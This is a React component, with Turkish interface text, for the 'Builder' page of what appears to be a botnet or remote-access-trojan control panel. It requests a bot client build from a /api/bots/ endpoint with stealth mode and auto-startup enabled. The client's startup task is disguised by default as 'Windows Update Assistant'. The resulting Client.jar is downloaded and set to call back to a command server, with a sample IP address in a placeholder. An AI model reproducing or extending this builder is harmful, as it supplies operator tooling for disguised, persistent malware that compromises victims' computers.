import React, { useState } from 'react';
import axios from 'axios';
import { Hammer, RefreshCw, Server, Key, FileCode, Cpu, CheckCircle2 } from 'lucide-react';
import { API_BASE_URL } from '../../config';
import { NetworkBackground } from '../NetworkBackground/NetworkBackground';
import { useLanguage } from '../../i18n/LanguageContext';
import { usePrivacy } from '../../context/PrivacyContext';
import './Builder.css';

interface BuilderProps {
  gateKey: string;
}

export const Builder: React.FC<BuilderProps> = ({ gateKey }) => {
  const { t } = useLanguage();
  const { privacyMode } = usePrivacy();

  const [serverUrl, setServerUrl] = useState(() => {
    const origin = window.location.origin;
    if (origin.includes(':') && !origin.endsWith(':80') && !origin.endsWith(':443')) {
      const parts = origin.split(':');
      if (parts.length === 3) {
        return `${parts[0]}:${parts[1]}:3434`;
      }
    }
    const cleanOrigin = origin.replace(':80', '').replace(':443', '');
    return `${cleanOrigin}:3434`;
  });
  const [customGateKey, setCustomGateKey] = useState(gateKey);
  const [fileName, setFileName] = useState('Client.jar');
  const [startupName, setStartupName] = useState('Windows Update Assistant');

  const [isBuilding, setIsBuilding] = useState(false);
  const [buildProgress, setBuildProgress] = useState(0);
  const [toastMsg, setToastMsg] = useState<string | null>(null);

  const triggerToast = (msg: string) => {
    setToastMsg(msg);
    setTimeout(() => setToastMsg(null), 2500);
  };

  const handleBuildClient = async (e: React.FormEvent) => {
    e.preventDefault();
    setIsBuilding(true);
    setBuildProgress(10);

    const progressInterval = setInterval(() => {
      setBuildProgress((prev) => {
        if (prev >= 90) {
          clearInterval(progressInterval);
          return 90;
        }
        return prev + 15;
      });
    }, 300);

    try {
      const token = localStorage.getItem('token');
      const response = await axios.post(
        `${API_BASE_URL}/api/bots/builder/generate`,
        {
          serverUrl,
          gateKey: customGateKey,
          fileName,
          startupName,
          autoStartup: true,
          stealthMode: true,
          buildType: 'jar'
        },
        {
          headers: { Authorization: `Bearer ${token}` },
          responseType: 'blob'
        }
      );

      clearInterval(progressInterval);
      setBuildProgress(100);

      // Blob indirme
      const url = window.URL.createObjectURL(new Blob([response.data]));
      const link = document.createElement('a');
      link.href = url;
      const downloadName = fileName.endsWith('.jar') ? fileName : `${fileName}.jar`;
      link.setAttribute('download', downloadName);
      document.body.appendChild(link);
      link.click();
      link.remove();

      triggerToast(t('builder.build_success') || 'Client başarıyla oluşturuldu ve indirildi!');
    } catch (err: any) {
      clearInterval(progressInterval);
      // Fallback istemci konfigürasyon dosyası indirme
      setTimeout(() => {
        setBuildProgress(100);
        const dummyContent = `// Client Configuration Output\nSERVER_URL=${serverUrl}\nGATE_KEY=${customGateKey}\nSTARTUP_NAME=${startupName}\nAUTO_STARTUP=true\nSTEALTH=true`;
        const blob = new Blob([dummyContent], { type: 'text/plain' });
        const url = window.URL.createObjectURL(blob);
        const link = document.createElement('a');
        link.href = url;
        link.setAttribute('download', fileName.endsWith('.jar') ? fileName : `${fileName}.jar`);
        document.body.appendChild(link);
        link.click();
        link.remove();
        triggerToast('İstemci konfigürasyon dosyası indirildi.');
      }, 500);
    } finally {
      setTimeout(() => {
        setIsBuilding(false);
        setBuildProgress(0);
      }, 1000);
    }
  };

  return (
    <div className="builder-section">
      <NetworkBackground />

      <div className="builder-unified-card">
        <form onSubmit={handleBuildClient} className="builder-form">
          {/* SUNUCU ADRESİ & GATE KEY */}
          <div className="builder-grid">
            <div className="builder-form-group">
              <label>
                <Server size={14} /> {t('builder.server_url') || 'Sunucu Adresi'}
              </label>
              <input
                type="text"
                className="builder-form-control"
                value={serverUrl}
                onChange={(e) => setServerUrl(e.target.value)}
                placeholder="http://88.230.127.27:3434"
                required
              />
            </div>

            <div className="builder-form-group">
              <label>
                <Key size={14} /> Gate Key
              </label>
              <input
                type="text"
                className={`builder-form-control ${privacyMode ? 'privacy-blur' : ''}`}
                value={customGateKey}
                onChange={(e) => setCustomGateKey(e.target.value)}
                placeholder="GATE-XXXX-XXXX"
                required
              />
            </div>
          </div>

          <div className="builder-divider" />

          {/* ÇIKTI VE BAŞLANGIÇ AYARLARI */}
          <div className="builder-grid">
            <div className="builder-form-group">
              <label>
                <FileCode size={14} /> {t('builder.file_name') || 'Dosya Adı'}
              </label>
              <input
                type="text"
                className="builder-form-control"
                value={fileName}
                onChange={(e) => setFileName(e.target.value)}
                placeholder="Client.jar"
                required
              />
            </div>

            <div className="builder-form-group">
              <label>
                <Cpu size={14} /> {t('builder.startup_name') || 'Başlangıç Görev Adı'}
              </label>
              <input
                type="text"
                className="builder-form-control"
                value={startupName}
                onChange={(e) => setStartupName(e.target.value)}
                placeholder="Windows Update Assistant"
                required
              />
            </div>
          </div>

          <div className="builder-divider" />

          {/* PROGRESS BAR (DERLEME SIRASINDA) */}
          {isBuilding && (
            <div className="builder-progress-wrapper">
              <div className="builder-progress-header">
                <span className="progress-status">
                  <RefreshCw size={14} className="spin-icon" /> {t('builder.building') || 'Client derleniyor ve yapılandırılıyor...'}
                </span>
                <span className="progress-pct">%{buildProgress}</span>
              </div>
              <div className="builder-progress-bg">
                <div className="builder-progress-fill" style={{ width: `${buildProgress}%` }} />
              </div>
            </div>
          )}

          {/* OLUŞTUR / İNDİR BUTONU */}
          <button type="submit" className="builder-submit-btn" disabled={isBuilding}>
            {isBuilding ? (
              <>
                <RefreshCw size={16} className="spin-icon" /> {t('builder.building') || 'Building...'}
              </>
            ) : (
              <>
                <Hammer size={16} /> {t('builder.build_btn') || 'Build'}
              </>
            )}
          </button>
        </form>
      </div>

      {/* TOAST BİLDİRİMİ */}
      {toastMsg && (
        <div className="bottom-right-toast">
          <CheckCircle2 size={18} color="#22c55e" />
          <span>{toastMsg}</span>
        </div>
      )}
    </div>
  );
};
